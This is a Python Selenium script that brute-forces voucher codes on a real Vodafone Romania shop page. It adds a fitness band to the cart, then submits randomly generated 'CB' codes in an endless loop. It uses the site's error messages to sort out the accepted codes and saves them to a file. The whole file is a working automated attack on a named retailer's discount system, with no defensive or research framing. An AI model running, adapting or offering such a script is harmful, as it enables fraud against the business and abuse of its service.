import random
import string
import time
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.common.exceptions import NoSuchElementException


# Function to generate a random code
def generate_code(prefix="CB", length=8):
    """Generates a random alphanumeric code starting with the given prefix."""
    characters = string.ascii_uppercase + string.digits
    return prefix + ''.join(random.choices(characters, k=length - len(prefix)))


# Function to read checked codes from a file
def load_checked_codes(filename):
    if not os.path.exists(filename):
        return set()  # Return an empty set if the file does not exist

    with open(filename, 'r') as file:
        return {line.strip() for line in file.readlines()}


# Function to save a checked code to the file
def save_checked_code(filename, code):
    with open(filename, 'a') as file:
        file.write(code + '\n')


# Set up Selenium WebDriver (Firefox) without headless mode
def setup_driver():
    firefox_options = Options()
    firefox_options.add_argument("--headless")  # Remove this line to run with GUI
    service = Service()  # Replace with the actual path to geckodriver
    driver = webdriver.Firefox(service=service, options=firefox_options)
    return driver


# Function to click on the cookie consent button
def accept_cookies(driver):
    try:
        cookie_button_xpath = '//*[@id="onetrust-accept-btn-handler"]'
        cookie_button = driver.find_element(By.XPATH, cookie_button_xpath)
        cookie_button.click()
        print("Cookie consent button clicked.")
        time.sleep(2)
    except NoSuchElementException:
        print("Cookie consent button not found or already accepted.")


# Function to navigate to the cart page (only once)
def navigate_to_cart_page(driver):
    try:
        driver.get("https://www.vodafone.ro/bratara-fitness-Xiaomi-Redmi_Smart_Band_8_Active-Negru")
        time.sleep(3)  # Wait for the page to load
        accept_cookies(driver)

        xpath_first_button = "/html/body/div[1]/div[2]/div/div[2]/div[3]/div[3]/div[1]/div/div[1]/article[2]/div[1]/div/div/label/span[1]/span/input"
        checkbox = driver.find_element(By.XPATH, xpath_first_button)
        if not checkbox.is_selected():
            checkbox.click()
            print("Checkbox selected.")
        else:
            print("Checkbox was already selected, skipping.")

        time.sleep(1)

        xpath_second_button = "/html/body/div[1]/div[2]/div/div[2]/div[3]/div[3]/div[1]/div/div[2]/button"
        driver.find_element(By.XPATH, xpath_second_button).click()
        time.sleep(3)

        print("Successfully navigated to the cart page.")
    except Exception as e:
        print(f"An error occurred during navigation: {e}")


# Function to enter and check a code on the cart page
def check_code_on_cart_page(driver, code):
    try:
        # Locate the input box for the voucher code
        xpath_input_box = "/html/body/div[1]/div/div/aside/div/div[1]/div/div/form/div/div[1]/div/input"
        input_box = driver.find_element(By.XPATH, xpath_input_box)
        input_box.clear()
        input_box.send_keys(code)

        # Locate and click the submit button
        xpath_submit_button = "/html/body/div[1]/div/div/aside/div/div[1]/div/div/form/div/div[2]/button"
        driver.find_element(By.XPATH, xpath_submit_button).click()
        time.sleep(2)  # Wait for the page to respond

        # Check for error messages
        xpath_error_message = "/html/body/div[1]/div/div/aside/div/div[1]/div/div/form/div/div[1]/div[2]/div/span[2]"
        try:
            error_message = driver.find_element(By.XPATH, xpath_error_message).text
            if "Codul de voucher a expirat." in error_message:
                print(f"Code {code} has expired, moving to the next one.")
                return False
            elif "Cod de voucher incorect." in error_message:
                print(f"Code {code} is invalid, moving to the next one.")
                return False
        except NoSuchElementException:
            print(f"Valid code found: {code}")
            return True  # No error message, so the code is valid
    except Exception as e:
        print(f"An error occurred while checking the code: {e}")
        return False


def main():
    driver = setup_driver()
    checked_codes_filename = 'checked_codes.txt'
    valid_codes_filename = 'valid_codes.txt'
    checked_codes = load_checked_codes(checked_codes_filename)

    try:
        navigate_to_cart_page(driver)

        while True:
            code = generate_code()

            if code in checked_codes:
                print(f"Code {code} was already checked, skipping.")
                continue

            print(f"Checking code: {code}")

            if check_code_on_cart_page(driver, code):
                print(f"Success! Valid code: {code}")
                save_checked_code(valid_codes_filename, code)  # Save valid code to a different file
                # Continue checking for more valid codes
            checked_codes.add(code)
            save_checked_code(checked_codes_filename, code)  # Save checked code to the file

    finally:
        driver.quit()  # Close the browser after execution


if __name__ == "__main__":
    main()
